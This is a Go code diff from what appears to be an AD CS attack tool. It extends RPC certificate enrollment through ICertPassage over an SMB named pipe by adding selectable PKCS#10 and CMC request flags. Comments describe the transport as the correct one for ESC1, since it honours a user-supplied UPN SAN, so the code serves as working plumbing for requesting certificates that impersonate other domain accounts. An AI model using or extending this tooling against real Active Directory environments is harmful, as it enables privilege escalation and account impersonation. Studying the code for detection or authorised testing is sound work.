@@ -23,13 +23,30 @@ const (
 	crDispUnderSubmission = 5
 )
 
+// CertServerRequest dwFlags request type constants (MS-WCCE 3.2.1.4.2.1.2)
+const (
+	crInBinary = 0x02  // CR_IN_BINARY — raw binary encoding
+	crInPKCS10 = 0x100 // CR_IN_PKCS10 — PKCS#10 certificate request
+	crInCMC    = 0x300 // CR_IN_CMC — CMC full PKI request (CMS SignedData wrapping)
+)
+
 // EnrollCertificateRPC performs certificate enrollment via MS-ICPR
 // (ICertPassage::CertServerRequest) over DCE/RPC on a named pipe.
 // This is the correct transport for ESC1 — the RPC interface honors
 // the UPN SAN from the CSR when CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT is set,
 // unlike the certsrv web enrollment which ignores CSR SAN extensions.
+// Uses CR_IN_PKCS10 request type for standard PKCS#10 CSR enrollment.
 func EnrollCertificateRPC(cfg *ADCSConfig, caHostname, caName, templateName string, csrDER []byte) (*x509.Certificate, error) {
-	fmt.Printf("[*] RPC enrollment via ICertPassage on %s\n", caHostname)
+	return EnrollCertificateRPCWithFlags(cfg, caHostname, caName, templateName, csrDER, crInBinary|crInPKCS10)
+}
+
+// EnrollCertificateRPCWithFlags performs certificate enrollment via MS-ICPR
+// with explicit dwFlags control. The requestFlags parameter sets the request
+// type in the CertServerRequest stub:
+//   - crInBinary|crInPKCS10 (0x102): standard PKCS#10 CSR
+//   - crInBinary|crInCMC    (0x302): CMC full PKI request (CMS SignedData wrapping)
+func EnrollCertificateRPCWithFlags(cfg *ADCSConfig, caHostname, caName, templateName string, requestBlob []byte, requestFlags uint32) (*x509.Certificate, error) {
+	fmt.Printf("[*] RPC enrollment via ICertPassage on %s (flags=0x%X)\n", caHostname, requestFlags)
 
 	conn, err := net.DialTimeout("tcp", caHostname+":445", 10*time.Second)
 	if err != nil {
@@ -79,7 +96,7 @@ func EnrollCertificateRPC(cfg *ADCSConfig, caHostname, caName, templateName stri
 	attribs := fmt.Sprintf("CertificateTemplate:%s", templateName)
 
 	// Call CertServerRequest (opnum 0)
-	certDER, disposition, err := certServerRequest(s, caName, attribs, csrDER)
+	certDER, disposition, err := certServerRequestWithFlags(s, caName, attribs, requestBlob, requestFlags)
 	if err != nil {
 		return nil, fmt.Errorf("CertServerRequest: %w", err)
 	}
@@ -203,22 +220,29 @@ func extractSMBSecurityBuffer(resp []byte) ([]byte, error) {
 	return resp[start:end], nil
 }
 
-// certServerRequest calls ICertPassage::CertServerRequest (opnum 0).
+// certServerRequest calls ICertPassage::CertServerRequest (opnum 0)
+// with default PKCS#10 flags (CR_IN_BINARY | CR_IN_PKCS10 = 0x102).
+func certServerRequest(s *smbSession, caName, attribs string, csrDER []byte) ([]byte, uint32, error) {
+	return certServerRequestWithFlags(s, caName, attribs, csrDER, crInBinary|crInPKCS10)
+}
+
+// certServerRequestWithFlags calls ICertPassage::CertServerRequest (opnum 0)
+// with explicit dwFlags control.
 //
 // NDR layout for CertServerRequest:
 //
-//	[in]  DWORD dwFlags          - CR_IN_BINARY | CR_IN_PKCS10
+//	[in]  DWORD dwFlags          - request type flags (CR_IN_BINARY|CR_IN_PKCS10 or CR_IN_BINARY|CR_IN_CMC)
 //	[in]  [string,unique] wchar_t* pwszAuthority - CA name
 //	[in,out] DWORD* pdwRequestId - request ID (0 for new)
 //	[in]  CERTTRANSBLOB ctbAttribs - attributes string (UTF-16LE)
-//	[in]  CERTTRANSBLOB ctbRequest - CSR (DER)
+//	[in]  CERTTRANSBLOB ctbRequest - CSR or CMC blob (DER)
 //
 // Returns: certificate DER bytes, disposition, error
-func certServerRequest(s *smbSession, caName, attribs string, csrDER []byte) ([]byte, uint32, error) {
+func certServerRequestWithFlags(s *smbSession, caName, attribs string, requestBlob []byte, flags uint32) ([]byte, uint32, error) {
 	callID := rand.Uint32()
 
 	// Build NDR stub data
-	stub := buildCertServerRequestStub(caName, attribs, csrDER)
+	stub := buildCertServerRequestStubWithFlags(caName, attribs, requestBlob, flags)
 
 	// DCE/RPC request header (type 0x00)
 	reqHdr := make([]byte, 8)
@@ -255,13 +279,18 @@ func certServerRequest(s *smbSession, caName, attribs string, csrDER []byte) ([]
 }
 
 // buildCertServerRequestStub builds the NDR-encoded stub data for
-// ICertPassage::CertServerRequest (opnum 0).
+// ICertPassage::CertServerRequest (opnum 0) with default PKCS#10 flags.
 func buildCertServerRequestStub(caName, attribs string, csrDER []byte) []byte {
+	return buildCertServerRequestStubWithFlags(caName, attribs, csrDER, crInBinary|crInPKCS10)
+}
+
+// buildCertServerRequestStubWithFlags builds the NDR-encoded stub data for
+// ICertPassage::CertServerRequest (opnum 0) with explicit dwFlags.
+func buildCertServerRequestStubWithFlags(caName, attribs string, requestBlob []byte, flags uint32) []byte {
 	var stub []byte
 
-	// dwFlags: CR_IN_BINARY(0x02) | CR_IN_PKCS10(0x100) = 0x102
-	// Actually for raw DER PKCS10: just use 0x100 (format) with binary encoding
-	stub = appendLE32(stub, 0x00000102)
+	// dwFlags: request type (e.g. CR_IN_BINARY|CR_IN_PKCS10=0x102, CR_IN_BINARY|CR_IN_CMC=0x302)
+	stub = appendLE32(stub, flags)
 
 	// pwszAuthority: [string,unique] wchar_t*
 	// NDR unique pointer: referent ID (non-zero) + conformant varying string
@@ -275,7 +304,7 @@ func buildCertServerRequestStub(caName, attribs string, csrDER []byte) []byte {
 	stub = ndrCertTransBlob(stub, attribsUTF16)
 
 	// ctbRequest: CERTTRANSBLOB { cb: DWORD, pb: [size_is(cb)] BYTE* }
-	stub = ndrCertTransBlob(stub, csrDER)
+	stub = ndrCertTransBlob(stub, requestBlob)
 
 	return stub
 }
